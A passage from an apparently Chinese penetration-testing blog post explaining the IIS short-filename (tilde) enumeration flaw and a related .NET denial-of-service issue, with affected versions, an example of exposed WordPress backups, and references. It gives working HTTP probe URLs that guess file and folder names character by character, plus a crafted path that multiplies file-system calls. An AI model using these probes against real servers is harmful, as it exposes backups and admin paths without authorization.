EditionWindows Vista Service Pack 2Windows Vista BusinessWindows Vista EnterpriseWindows Vista Home PremiumWindows Vista UltimateWindows Server 2008 Service Pack 2Windows Server 2008 StandardWindows Server 2008 EnterpriseWindows Server 2008 DatacenterWindows Server 2008 for Itanium-Based SystemsWindows 7 Service Pack 1Windows 7 Home PremiumWindows 7 ProfessionalWindows 7 EnterpriseWindows 7 UltimateWindows Server 2008 R2 Service Pack 1Windows Server 2008 R2 StandardWindows Server 2008 R2 EnterpriseWindows Server 2008 R2 DatacenterWindows Server 2008 R2 for Itanium-Based SystemsWindows 8 EnterpriseWindows 8 ProWindows Server 2012 FoundationWindows Server 2012 FoundationWindows Server 2012 FoundationWindows Server 2012 FoundationWindows Server 2012 StandardWindows Server 2012 StandardWindows Server 2012 StandardWindows Server 2012 StandardWindows Server 2012 DatacenterWindows Server 2012 DatacenterWindows Server 2012 DatacenterWindows Server 2012 Datacenter<br/>
+列表内所有操作系统均受影响（数据来源日期：20171213）<br/><br/>
+该漏洞有其局限性：<br/><br/>
+1、只能猜解文件/文件夹名前六位，以及扩展名前三位<br/><br/>
+2、名称较短的文件是没有响应的短文件名的<br/><br/>
+3、需要 IIS 和 .net 同时满足。  </p>
+
+<h2 id="toc_6">漏洞详情</h2>
+
+<hr/>
+
+<p>在 windows 上的 Apache（Apache支持短文件名）上运行的 web 应用程序正在创建一个长文件名文件（如sql备份文件或会话文件，假设文件名是 backup-082119f75623eb7abd7bf357698ff66c.sql，windows 将创建短文件名 BACKUP〜1.SQL）。这种情况下，如果我们用短文件名访问这个文件，那么就有可能获取这个包含sql数据库备份的文件。<br/><br/>
+比较著名的一个例子：<br/><br/>
+wordpress 有一个备份博客的插件，该插件会为备份创建一个自定义目录（backup-88456）。备份完成后，该目录包含一个名为 wordpress_wp_20120702_576.sql 的文件  ，即 WordPress 数据库备份。这本应该难以猜测的，因为我们的目录名称中有5个数字加上日期和另外3个数字，即使忽略日期也至少有 100,000,000 个组合。然而由于短文件名的原因，目录名会变成 BACKUP~1 而文件名会变成 WORDPR~1.SQL。100,000,000 个组合被缩减为一个组合。    </p>
+
+<h2 id="toc_7">漏洞利用</h2>
+
+<hr/>
+
+<p><strong>短文件名漏洞</strong><br/>
+漏洞利用需要使用到通配符。在 windows 中，* 可以匹配n个字符（n可以为0,一个星号和n个星号的意义一样）。判断某站点是否存在 IIS 短文件名爆破，构造如下payload：    </p>
+
+<pre class="line-numbers"><code class="language-http">1. http://www.xxx.com/*~1*/.aspx
+2. http://www.xxx.com/l1j1e*~1*/.aspx
+</code></pre>
+
+<p>若1返回404而2返回400，则可以判断目标站点存在漏洞。<br/><br/>
+判断漏洞存在后，继续猜解目录下是否存在a开头的文件或文件夹，访问：    </p>
+
+<pre class="line-numbers"><code class="language-http">http://www.xxx.com/a*~1*/.aspx
+</code></pre>
+
+<p>若存在将返回404，不存在则返回400。以此类推，不断向下猜解所有的6个字符。<br/><br/>
+到此要考虑两种情况，若abcdef开头的是一个文件夹则    </p>
+
+<pre class="line-numbers"><code class="language-http">http://www.xxx.com/abcdef*/~1/.aspx
+</code></pre>
+
+<p>返回404。若abcdef开头的是一个文件，则    </p>
+
+<pre class="line-numbers"><code class="language-http">http://www.xxx.com/abcdef*~1/.aspx
+</code></pre>
+
+<p>返回404（注意！返回404表示存在）同理我们可以猜出文件后缀名：    </p>
+
+<pre class="line-numbers"><code class="language-http">http://www.xxx.com/abcdef*~1*h*/.aspx
+</code></pre>
+
+<p>若返回404则代表扩展名中肯定存在h字符。<br/><br/>
+利用此漏洞可以猜解后台地址、敏感文件/文件名（如备份的rar、bak、sql等）；某些情况下，可以通过短文件名漏洞直接下载对应的文件（如备份sql文件）。<br/><br/>
+<br><br/>
+<strong>.Net Framework 拒绝服务攻击</strong><br/><br/>
+当请求文件夹名称包含 ~1 的请求，会导致不存在该文件的 .Net Framework 去递归查询所有根目录。如果只有一个“~1”是无效的，当“~1”大于一个，比如像这样：        </p>
+
+<pre class="line-numbers"><code class="language-http">\wwwtest\fuck~1\~1\~1\~1.aspx
+</code></pre>
+
+<p>此时文件系统会这样调用：    </p>
+
+<pre class="line-numbers"><code class="language-txt">\wwwtest                           SUCCESS
+\wwwtest\fuck~1\~1\~1\~1           PATH NOT FOUND
+\wwwtest\fuck~1                    NAME NOT FOUND
+\wwwtest\fuck~1\~1\                PATH NOT FOUND
+\wwwtest\fuck~1\~1\~1\             PATH NOT FOUND
+\wwwtest\fuck~1\~1\~1\~1.aspx      PATH NOT FOUND
+\wwwtest\fuck~1\~1\~1\~1.aspx      PATH NOT FOUND
+\wwwtest\fuck~1\~1\~1              PATH NOT FOUND
+\wwwtest\fuck~1\~1\~1\~1.aspx      PATH NOT FOUND
+\wwwtest\fuck~1\~1\~1              PATH NOT FOUND
+\wwwtest\fuck~1\~1                 PATH NOT FOUND
+\wwwtest\fuck~1                    NAME NOT FOUND
+\wwwtest                           SUCCESS
+\wwwtest                           SUCCESS
+</code></pre>
+
+<p>如果我们请求的文件/文件夹名同时存在大小写时，这个请求会被请求两次，一次是原封不动的请求，一次是全部使用小写的请求。<br/><br/>
+下表显示了每个请求的FS调用的数量（Windows 2008 R2, IIS 7.5(latest patch – June 2012), and .Net framework 4.0.30319 (在别的系统下可能会不同)）<br/><br/>
+<figure><img src="media/15446866501207/F5%E8%B0%83%E7%94%A8.png" alt="F5调用"/><figcaption>F5调用</figcaption></figure></p>
+
+<p>这个问题适用于当时的 .Net framework 的所有版本(<br/><br/>
+    IIS 1.0, Windows NT 3.51<br/><br/>
+    IIS 2.0, Windows NT 4.0<br/><br/>
+    IIS 3.0, Windows NT 4.0 Service Pack 2<br/><br/>
+    IIS 4.0, Windows NT 4.0 Option Pack<br/><br/>
+    IIS 5.0, Windows 2000<br/><br/>
+    IIS 5.1, Windows XP Professional and Windows XP Media Center Edition<br/><br/>
+    IIS 6.0, Windows Server 2003 and Windows XP Professional x64 Edition<br/><br/>
+    IIS 7.0, Windows Server 2008 and Windows Vista<br/><br/>
+    IIS 7.5, Windows 7 (error remotely enabled or no web.config)<br/><br/>
+    IIS 7.5, Windows 2008 (classic pipeline mode))<br/><br/>
+只是 F5 的调用次数会有不同。    </p>
+
+<h2 id="toc_8">参考链接</h2>
+
+<hr/>
+
+<ul>
+<li><a href="http://www.lijiejie.com/iis-win8-3-shortname-brute/">http://www.lijiejie.com/iis-win8-3-shortname-brute/</a><br/></li>
+<li><a href="https://www.acunetix.com/blog/articles/windows-short-8-3-filenames-web-security-problem/">https://www.acunetix.com/blog/articles/windows-short-8-3-filenames-web-security-problem/</a><br/></li>
+<li><a href="http://www.freebuf.com/articles/4908.html">http://www.freebuf.com/articles/4908.html</a><br/></li>
+<li><a href="https://support.microsoft.com/zh-cn/help/121007/how-to-disable-8-3-file-name-creation-on-ntfs-partitions">https://support.microsoft.com/zh-cn/help/121007/how-to-disable-8-3-file-name-creation-on-ntfs-partitions</a><br/></li>
+<li><a href="https://soroush.secproject.com/downloadable/microsoft_iis_tilde_character_vulnerability_feature.pdf">https://soroush.secproject.com/downloadable/microsoft_iis_tilde_character_vulnerability_feature.pdf</a><br/></li>
+</ul>
+
+                        
+                      </div>
+                  </div>
+                </a>
+                <div class="read-more clearfix">
+                  <div class="more-left left">
+                  
+                    <span class="date">2018/12/13 15:37 下午</span>
+                    <span>posted in&nbsp;</span> 
+          				  
+          					    <span class="posted-in"><a href='%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.html'>渗透测试</a></span>
           				   
                   </div>
                   <div class="more-right right">
